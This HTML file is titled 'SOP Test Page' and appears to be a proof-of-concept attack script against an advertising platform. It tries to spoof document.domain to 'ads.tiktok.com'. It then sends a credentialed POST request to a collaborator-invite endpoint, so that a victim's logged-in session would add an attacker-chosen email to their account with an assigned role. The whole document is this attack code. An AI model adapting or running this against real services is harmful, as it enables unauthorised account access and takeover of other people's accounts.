<html>
<head>
  <title>SOP Test Page</title>
  <script>
    try {
      Object.defineProperty(document, 'domain', {
        value: 'ads.tiktok.com',
        writable: true
      });
      console.log('[+] Spoofed document.domain: ', document.domain);
    } catch (e) {
      console.error('[!] Spoof failed:', e.message);
    }

    window.onload = function () {
      const origin = location.origin;
      console.log('[*] Page origin:', origin);
      fetch("/CreativeOne/Client/ClientInviteCollaborationUser", {
        method: "POST",
        credentials: "include",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          targetEmails: ["test@example.com"],
          role: 2
        })
      }).then(res => res.text()).then(console.log).catch(console.error);
    };
  </script>
</head>
<body>
  <h1>Hi</h1>
</body>
</html>


